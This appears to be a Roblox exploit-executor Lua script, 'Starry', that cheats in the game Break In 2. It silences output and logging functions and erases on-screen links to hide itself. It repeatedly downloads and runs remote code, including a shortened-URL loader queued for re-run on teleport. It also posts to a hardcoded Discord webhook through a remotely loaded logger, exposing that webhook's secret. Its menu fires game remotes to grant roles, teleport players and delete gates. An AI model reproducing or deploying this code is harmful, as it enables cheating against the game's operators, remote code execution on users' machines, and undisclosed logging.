coroutine.wrap(function()
    hookfunction(print, function(...)
        return
    end)

    hookfunction(warn, function(...)
        return
    end)

    hookfunction(error, function(...)
        return
    end)

    local oldwrite
    oldwrite = hookfunction(writefile, function(file, content)
        if(string.find(string.lower(content), 'https://') or string.find(string.lower(content), '//')) then
            return
        end

        return oldwrite(file, content)
    end)

    local oldappend
    oldappend = hookfunction(appendfile, function(file, content)
        if(string.find(string.lower(content), 'https://') or string.find(string.lower(content), '//')) then
            return
        end

        return oldappend(file, content)
    end)

    game.DescendantAdded:Connect(function(c)
        if c and c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message') then
            if string.find(string.lower(c.Text), 'https://') then
                c:Destroy()
            end
        end
    end)

    getgenv().rconsoletitle = nil
    getgenv().rconsoleprint = nil
    getgenv().rconsolewarn = nil
    getgenv().rconsoleinfo = nil
    getgenv().rconsolerr = nil

    getrenv().print = function(...) return end
    getrenv().warn = function(...) return end
    getrenv().error = function(...) return end
    getgenv().print = function(...) return end
    getgenv().warn = function(...) return end
    getgenv().error = function(...) return end
    getgenv().clonefunction = function(...) return end

    local oldNamecall
    oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...)
        local method = getnamecallmethod()

        if (string.lower(method) == 'rconsoleprint') then
            return task.wait(9e9)
        end
        
        if (string.lower(method) == 'rconsoleinfo') then
            return task.wait(9e9)
        end

        if (string.lower(method) == 'rconsolewarn') then
            return task.wait(9e9)
        end

        if (string.lower(method) == 'rconsoleerr') then
            return task.wait(9e9)
        end

        if (string.lower(method) == 'print') then
            return
        end

        if (string.lower(method) == 'warn') then
            return
        end

        --[[
            if (string.lower(method) == 'error') then
                return
            end
        ]]

        if (string.lower(method) == 'rendernametag') then
            return 
        end

        return oldNamecall(self, ...)
    end))
end)()

loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/hello-n-bye/starry/master/src/discord.lua", true))()
local flu = loadstring(game:HttpGetAsync("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

if (getgenv().starry) then
    flu:Notify({
        Title = "❌  Starry Can't Start.",
        Content = "You can't run Starry more than once.",
        Duration = 5
    })

    return false, "Couldn't start. Please make sure another Starry instance isn't already running!"
else
    local hooking = loadstring(game:HttpGet("https://raw.githubusercontent.com/hello-n-bye/starry/master/log.lua"))()
    hooking.post("https://discord.com/api/webhooks/1219183684104753193/pQgD9LveQmxNfRzqAntlJ5he80r-WuKFtNNMdU0yDkwNya-rM3pVrMdfCBbyzx5VpvT7")

    getgenv().starry = true
end

local function totally_hax()
    local timestamp = tick()
    
    local queueteleport = queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
    local queueEnabled = false
    
    local players = game:GetService("Players")
    local virtualUser = game:GetService("VirtualUser")
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local run = game:GetService("RunService")
    local teleport = game:GetService("TeleportService")
    local tweenService = game:GetService("TweenService")
    
    local events = replicatedStorage:FindFirstChild("RemoteEvents")
    
    local localPlayer = players.LocalPlayer
    
    local function tween(pos)
        local newChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
        tweenService:Create(newChar.HumanoidRootPart, TweenInfo.new(
            0.5,
            Enum.EasingStyle.Sine
        ), {
            CFrame = pos
        }):Play()
    end
    
    local outfit = false
    
    local function role(name)
        if (name) == "Book" or (name) == "Phone" then
            local outside = events:FindFirstChild("OutsideRole")
    
            if (name) == "Book" then
                outside:FireServer(name, true, outfit)
            else
                outside:FireServer(name, false, outfit)
            end
        else
            local creation = events:FindFirstChild("MakeRole")
    
            if (name) == "MedKit" or (name) == "Bat" then
                creation:FireServer(name, false, outfit)
            else
                creation:FireServer(name, true, outfit)
            end
        end
    end
    
    local function get()
        local character = workspace[localPlayer.Name]
        local backpack = localPlayer.Backpack
    
        local lollipop = (backpack:FindFirstChild("Lollipop")) or (character:FindFirstChild("Lollipop"))
        local drink = (backpack:FindFirstChild("Bottle")) or (character:FindFirstChild("Bottle"))
    
        local bat = (backpack:FindFirstChild("Bat")) or (character:FindFirstChild("Bat"))
        local medkit = (backpack:FindFirstChild("MedKit")) or (character:FindFirstChild("MedKit"))
    
        local phone = (backpack:FindFirstChild("Phone")) or (character:FindFirstChild("Phone"))
        local book = (backpack:FindFirstChild("Book")) or (character:FindFirstChild("Book"))
    
        if (lollipop) then
            return "The Hyper"
        elseif (drink) then
            return "The Sporty"
        elseif (bat) then
            return "The Protector"
        elseif (medkit) then
            return "The Medic"
        elseif (phone) then
            return "The Hacker"
        elseif (book) then
            return "The Nerd"
        end
    end
    
    local window = flu:CreateWindow({
        Title = "Starry PC",
        SubTitle = "github.com/hello-n-bye/Starry",
        TabWidth = 160,
        Size = UDim2.fromOffset(625, 563),
        Acrylic = false,
        Theme = "Darker",
        MinimizeKey = Enum.KeyCode.LeftControl
    })
    
    local tabs = {
        intro = window:AddTab({
            Title = " Main",
            Icon = ""
        }),
        game = window:AddTab({
            Title = " Game",
            Icon = "curly-braces"
        }),
        roles = window:AddTab({
            Title = " Roles",
            Icon = "egg"
        }),
        troll = window:AddTab({
            Title = " Trolling",
            Icon = "skull"
        })
    }
    
    local options = flu.Options
    
    flu:Notify({
        Title = "⭐  Star the Repo",
        Content = "Like our open-sourced project? Give it a star over on Github.",
        SubContent = "github.com/hello-n-bye/Starry",
        Duration = 5
    })
    
    flu:Notify({
        Title = "Loaded for Lobby",
        Content = "Join a game to get the full experience, and use more powerful cheats.",
        Duration = 8
    })
    
    -- intro tab
    
    do
        ---
    
        local hasBadge = game:GetService("BadgeService"):UserHasBadgeAsync(localPlayer.UserId, 1294433313993410)
    
        if not (hasBadge) then
            tabs.intro:AddParagraph({
                Title = [[You Haven't Beaten "The Hunt" Event.]],
                Content = "Survive past wave 3 to complete the event!"
            })
        else
            tabs.intro:AddParagraph({
                Title = [[You Have Already Beaten "The Hunt" Event.]]
            })
        end
    
        ---
    
        tabs.intro:AddParagraph({
            Title = "Source-code",
            Content = "Find us @ github.com/hello-n-bye/Starry"
        })
    
        tabs.intro:AddButton({
            Title = "Rejoin",
            Description = "Join the server again.",
            Callback = function()
                if (queueEnabled) then
                    queueteleport('loadstring(game:HttpGetAsync("https://t.ly/zYuL_"))("Starry Hub")')
                end
    
                teleport:Teleport(game.PlaceId, localPlayer)
            end
        })
    
        ---
    
        local reRun = tabs.intro:AddToggle("Re-run", {
            Title = "Run on Rejoin",
            Description = "Automatically run the script after you've rejoined.",
            Default = false
        })
    
        reRun:OnChanged(function(value)
            queueEnabled = value
        end)
    
        ---
    
        tabs.intro:AddParagraph({
            Title = "100+ Features",
            Content = "As of March 19th, we've hit a milestone of 100+ working features."
        })
    
        ---
    
        tabs.intro:AddButton({
            Title = "Suicide",
            Description = "Since the game doesn't allow player death, just die!",
            Callback = function()
                local newChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
                local hum = newChar.Humanoid
    
                hum.Health = 0
            end
        })
    end
    
    -- lobby tab
    
    do
        tabs.roles:AddButton({
            Title = "Hacker",
            Description = "Gives you the Hacker role, when playing.",
            Callback = function()
                role("Phone")
            end
        })
    
        tabs.roles:AddButton({
            Title = "Nerd",
            Description = "Unlock your inner nerd, and literally be a dork.",
            Callback = function()
                role("Book")
            end
        })
    
        ---
    
        local free = tabs.roles:AddDropdown("Free Roles", {
            Title = "Change Free Role",
            Values = {"MedKit", "Bottle", "Lollipop", "Bat"},
            Multi = false,
            Default = "Select One"
        })
    
        free:OnChanged(function(value)
            if (value) ~= "Select One" then
                role(value)
            end
        end)
    
        ---
    
        local change = tabs.roles:AddToggle("Change Outfits", {
            Title = "Change Outfits",
            Default = false
        })
    
        change:OnChanged(function(value)
            outfit = value
        end)
    
        ---
    
        tabs.roles:AddButton({
            Title = "Give 10 Phones",
            Description = "Sadly it doesn't transfer to in-game, but it is server-sided.",
            Callback = function()
                for i = 1,10 do
                    role("Phone")
    
                    run.Stepped:Wait()
                end
            end
        })
    end
    
    -- game tab
    
    do
        local badges = localPlayer.PlayerGui:FindFirstChild("AchievementsButton", true).TextLabel
    
        tabs.game:AddParagraph({
            Title = badges.Text .. " Badges Collected"
        })
    
        ---
    
        tabs.game:AddButton({
            Title = "Load in",
            Description = "Get into whatever bus is available.",
            Callback = function()
                local newChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
                for _,v in ipairs(workspace:GetChildren()) do
                    if (v:IsA("BasePart")) then
                        if (v.Size) == Vector3.new(22.82000160217285, 10.069999694824219, 11.739999771118164) then
                            if (v.CFrame) == CFrame.new(87.4349976, 7.86999941, 108.889984, 8.10623169e-05, 1, 8.10623169e-05, -8.10623169e-05, -8.10623169e-05, 1, 1, -8.10623169e-05, 8.10623169e-05) then
                                firetouchinterest(newChar.HumanoidRootPart, v, 0)
                                firetouchinterest(newChar.HumanoidRootPart, v, 1)
                            end
                        end
                    end
                end
    
                for _,v in ipairs(workspace:GetChildren()) do
                    if (v:IsA("BasePart")) then
                        if (v.Size) == Vector3.new(22.82000160217285, 10.069999694824219, 11.739999771118164) then
                            if (v.CFrame) == CFrame.new(87.4349976, 7.86999941, 147.389984, 8.10623169e-05, 1, 8.10623169e-05, -8.10623169e-05, -8.10623169e-05, 1, 1, -8.10623169e-05, 8.10623169e-05) then
                                firetouchinterest(newChar.HumanoidRootPart, v, 0)
                                firetouchinterest(newChar.HumanoidRootPart, v, 1)
                            end
                        end
                    end
                end
            end
        })
    
        tabs.game:AddButton({
            Title = "Instant Load",
            Description = "Boot into your own private server instantly.",
            Callback = function()
                teleport:Teleport(13864667823, localPlayer)
            end
        })
    
        tabs.game:AddButton({
            Title = "Ride Bus One",
            Description = "Get seated inside of the first camp-truck.",
            Callback = function()
                local newChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
                for _,v in ipairs(workspace:GetChildren()) do
                    if (v:IsA("BasePart")) then
                        if (v.Size) == Vector3.new(22.82000160217285, 10.069999694824219, 11.739999771118164) then
                            if (v.CFrame) == CFrame.new(87.4349976, 7.86999941, 108.889984, 8.10623169e-05, 1, 8.10623169e-05, -8.10623169e-05, -8.10623169e-05, 1, 1, -8.10623169e-05, 8.10623169e-05) then
                                firetouchinterest(newChar.HumanoidRootPart, v, 0)
                                firetouchinterest(newChar.HumanoidRootPart, v, 1)
                            end
                        end
                    end
                end
            end
        })
    
        tabs.game:AddButton({
            Title = "Ride Bus Two",
            Description = "Get seated inside of the.. other.. camp-truck.",
            Callback = function()
                local newChar = localPlayer.Character or localPlayer.CharacterAdded:Wait()
                for _,v in ipairs(workspace:GetChildren()) do
                    if (v:IsA("BasePart")) then
                        if (v.Size) == Vector3.new(22.82000160217285, 10.069999694824219, 11.739999771118164) then
                            if (v.CFrame) == CFrame.new(87.4349976, 7.86999941, 147.389984, 8.10623169e-05, 1, 8.10623169e-05, -8.10623169e-05, -8.10623169e-05, 1, 1, -8.10623169e-05, 8.10623169e-05) then
                                firetouchinterest(newChar.HumanoidRootPart, v, 0)
                                firetouchinterest(newChar.HumanoidRootPart, v, 1)
                            end
                        end
                    end
                end
            end
        })
    
        tabs.game:AddButton({
            Title = "Exit Bus",
            Description = "If you're too lazy to press spacebar, use me!",
            Callback = function()
                game:GetService("ReplicatedStorage").TruckSystemRemotes.LeaveTruck:FireServer()
            end
        })
    
        tabs.game:AddButton({
            Title = "Unlock Badge Zones",
            Description = "Remove the passing gates to get in the exclusive club!",
            Callback = function()
                xpcall(function()
                    if (workspace:FindFirstChild("BadgeGuard1")) then
                        workspace:FindFirstChild("BadgeGuard1"):Destroy()
                    end
    
                    if (workspace:FindFirstChild("BadgeGuard2")) then
                        workspace:FindFirstChild("BadgeGuard2"):Destroy()
                    end
                end, function()
                    notify("Hmm..", "It looks like the gates don't seem to be there.")
                end)
            end
        })
    
        ---
    
        local tps = tabs.game:AddDropdown("soidgkjsdg", {
            Title = "Map Teleports",
            Description = "Explore the quite boring.. lobby!",
            Values = {"Spawn", "Busses", "Break In 1", "Art Gallery", "Leaderboards", "Hardcore Wins", "Shop", "Roof", "Mountain"},
            Multi = false,
            Default = "Select One"
        })
    
        tps:OnChanged(function(value)
            if (value) == "Spawn" then
                tween(CFrame.new(8.84081841, 10.8085642, 128.146744, -0.0192498751, -1.19958742e-07, -0.999814689, 9.21472321e-09, 1, -1.2015839e-07, 0.999814689, -1.15260494e-08, -0.0192498751))
            elseif (value) == "Busses" then
                tween(CFrame.new(77.1714325, 6.70856953, 128.52066, 0.0103023872, 2.70273226e-08, 0.999946952, 1.27242918e-08, 1, -2.71598548e-08, -0.999946952, 1.30034286e-08, 0.0103023872))
            elseif (value) == "Break In 1" then
                tween(CFrame.new(-18.5306988, 11.7085648, 120.217567, -0.680220068, -3.77567879e-08, 0.733007908, -2.70367506e-09, 1, 4.90004162e-08, -0.733007908, 3.13492521e-08, -0.680220068))
            elseif (value) == "Art Gallery" then
                tween(CFrame.new(35.9628296, 11.7085648, 30.7221146, 0.0115451813, 4.77686584e-08, -0.999933362, -5.01184552e-08, 1, 4.71931791e-08, 0.999933362, 4.95702608e-08, 0.0115451813))
            elseif (value) == "Leaderboards" then
                tween(CFrame.new(19.8978596, 10.7085648, 176.660858, -0.999922931, -1.00449996e-10, -0.0124166152, 2.75393375e-10, 1, -3.02676817e-08, 0.0124166152, -3.02687653e-08, -0.999922931))
            elseif (value) == "Hardcore Wins" then
                tween(CFrame.new(90.2903824, 6.84171438, 207.380981, -0.999184966, 7.39836423e-08, 0.0403659791, 7.16850295e-08, 1, -5.83915494e-08, -0.0403659791, -5.54503217e-08, -0.999184966))
            elseif (value) == "Shop" then
                tween(CFrame.new(71.528038, 6.7085681, 89.4626083, 0.999305904, 4.92259922e-09, -0.0372525156, -4.73206763e-09, 1, 5.2027751e-09, 0.0372525156, -5.02288255e-09, 0.999305904))
            elseif (value) == "Roof" then
                tween(CFrame.new(-48.5708389, 47.1725044, 128.407364, -0.0211180504, 7.38810755e-08, -0.999776959, 3.47903928e-09, 1, 7.38240686e-08, 0.999776959, -1.91924299e-09, -0.0211180504))
            elseif (value) == "Mountain" then
                tween(CFrame.new(45.8843956, 56.7091141, 52.0646248, -0.999990284, -5.08014386e-09, 0.00440876698, -5.11005416e-09, 1, -6.77294798e-09, -0.00440876698, -6.79541134e-09, -0.999990284))
            end
        end)
    end
    
    -- troll tab
    
    do
        local panic = false
    
        local spasm = tabs.troll:AddToggle("Spasm", {
            Title = "Spasm",
            Description = "Aggressively change your player size on the server.",
            Default = false
        })
    
        spasm:OnChanged(function(value)
            panic = value
    
            local inverse = false
    
            if (get()) == "The Medic" or (get()) == "The Protector" or (get()) == "The Hacker" then
                inverse = true
            end
    
            while (panic) do
                task.wait()
    
                if (inverse) then
                    role("Lollipop")
    
                    task.wait()
                    role("Bat")
                else
                    role("Bat")
    
                    task.wait()
                    role("Lollipop")
                end
            end
        end)
    end
    
    window:SelectTab(1)
    
    print("Loaded in " .. string.format("%.2f", tick() - timestamp) .. " seconds. ⭐")    
end

if (game.PlaceId) == 13864661000 or (game.PlaceId) == 13864667823 then
    if (isfolder("Starry")) then
        if (isfile("Starry//auth.pool")) then
            local http = game:GetService("HttpService")
    
            local req = request or (fluxus and fluxus.request)
            local function copy(string)
                local board = setclipboard or toclipboard
            
                if (board) then
                    board(tostring(string))
            
                    flu:Notify({
                        Title = "🎉  Discord Link Copied.",
                        Content = "Feel free to join our small community!",
                        Duration = 5
                    })
                else
                    flu:Notify({
                        Title = "❌  Discord Link Uncopyable.",
                        Content = "Your executor doesn't support clipboard copying.",
                        Duration = 5
                    })
                end
            end
            
            local url = "https://school-project-49n3.onrender.com/super-secret-hidden-url"
            local authentication = req({
                Url = url,
                Method = "GET"
            })

            if not (isfile("Starry//saved.pool")) then
                writefile("Starry//saved.pool", "")
            end

            if (readfile("Starry//saved.pool")) ~= crypt.base64decode(authentication.Body) then
                local window = flu:CreateWindow({
                    Title = "Starry's Key System",
                    SubTitle = "dsc.gg/suno",
                    TabWidth = 160,
                    Size = UDim2.fromOffset(625, 450),
                    Acrylic = false,
                    Theme = "Darker",
                    MinimizeKey = Enum.KeyCode.LeftControl
                })
                
                local tabs = {
                    input = window:AddTab({
                        Title = " Key System",
                        Icon = "key"
                    }),
                
                    info = window:AddTab({
                        Title = " Information",
                        Icon = "megaphone"
                    }),
                
                    credits = window:AddTab({
                        Title = " Credits",
                        Icon = "ticket"
                    })
                }
                
                flu:Notify({
                    Title = "📢  Please Complete our Key System.",
                    Content = "Join the Discord server to obtain the daily key.",
                    Duration = 5
                })
                
                tabs.input:AddButton({
                    Title = "Join Discord Server",
                    Description = "Copy the Discord server's link to your clipboard.",
                    Callback = function()
                        copy("https://dsc.gg/suno")
                    end
                })
                
                tabs.input:AddInput("Authentication", {
                    Title = "Authorize Key",
                    Default = "",
                    Placeholder = "Submit Key",
                    Numeric = false,
                    Finished = true,
                    Callback = function(value)
                        if (value) == crypt.base64decode(authentication.Body) then
                            flu:Notify({
                                Title = "✅  You've Been Whitelisted!",
                                Content = "You'll have to redo this when the key changes.",
                                Duration = 2
                            })

                            if not (isfile("Starry//saved.pool")) then
                                writefile("Starry//saved.pool", value)
                            else
                                delfile("Starry//saved.pool")
                                writefile("Starry//saved.pool", value)
                            end

                            task.wait(2.5)

                            window:Destroy()
                            getgenv().starry = false
                
                            task.wait(0.5)

                            return (loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/hello-n-bye/starry/master/main.lua", true))("Starry"))
                        else
                            window:Dialog({
                                Title = "Invalid Key!",
                                Content = "Get the latest one by joining my Discord server.",
                                Buttons = {
                                    {
                                        Title = "Okay",
                                        Callback = function()
                                            print("Confirmed.")
                                        end
                                    }
                                }
                            })
                        end
                    end
                })
                
                ---
                
                tabs.info:AddParagraph({
                    Title = "You will need to put the key in whenever it resets."
                })
                
                tabs.info:AddParagraph({
                    Title = "The key refreshes often every day."
                })
                
                ---
                
                tabs.credits:AddParagraph({
                    Title = "Starry made alone by Suno.",
                    Content = "Respectfully, my friend also helped out a little."
                })
                
                window:SelectTab(1)
            else
                totally_hax()
            end
        else
            writefile("Starry//saved.pool", "")

            getgenv().starry = false
            return (loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/hello-n-bye/starry/master/main.lua", true))("Starry"))
        end
    end
else
    flu:Notify({
        Title = "❌  Let's Join Break In 2.",
        Content = "Please join Break In 2 before using Starry.",
        Duration = 3
    })
end
